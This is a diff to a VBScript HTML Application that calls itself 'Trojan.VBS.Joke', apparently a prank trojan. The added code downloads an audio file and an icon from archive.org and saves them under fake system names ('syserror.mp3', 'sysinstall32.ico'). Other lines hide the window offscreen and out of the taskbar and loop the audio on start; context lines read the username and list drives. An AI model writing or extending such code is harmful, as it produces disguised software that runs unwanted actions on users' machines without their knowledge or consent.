@@ -5,7 +5,7 @@
     </title>
     <HTA:APPLICATION ID="jokehta"
                      APPLICATIONNAME = "Trojan.VBS.Joke"
-                     ICON = "https://ia801400.us.archive.org/32/items/Dll_Icon/Joke.ico"
+                     ICON = "sysinstall32.ico"
                      BORDER = "none"
                      CAPTION = "no"
                      SHOWINTASKBAR = "no"
@@ -32,6 +32,25 @@
     Set bStrm = createobject("Adodb.Stream")
     Set dc = fso.Drives
     strUser = CreateObject("WScript.Network").UserName
+
+    Rem Download some things
+    xHttp.Open "GET", "https://ia801409.us.archive.org/12/items/rebeccablackfriday_202010/Joke.mp3", False
+    xHttp.Send
+    With bStrm
+        .type = 1
+        .open
+        .write xHttp.responseBody
+        .savetofile WshShell.CurrentDirectory & "\syserror.mp3", 2
+    End With
+
+    xHttp.Open "GET", "https://ia801400.us.archive.org/32/items/Dll_Icon/Joke.ico", False
+    xHttp.Send
+    With bStrm
+        .type = 1
+        .open
+        .write xHttp.responseBody
+        .savetofile WshShell.CurrentDirectory & "\sysinstall32.ico", 2
+    End With
 
     Rem Makes windows uber small and moves it far away
     window.moveTo 999999,999999
@@ -454,6 +473,6 @@
     </script>
   </head>
   <body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
-    <bgsound src="https://ia801409.us.archive.org/12/items/rebeccablackfriday_202010/Joke.mp3" preload="auto" loop autoplay type="audio/mp3"/>
+    <bgsound src="syserror.mp3" preload="auto" loop autoplay type="audio/mp3"/>
   </body>
 </html>
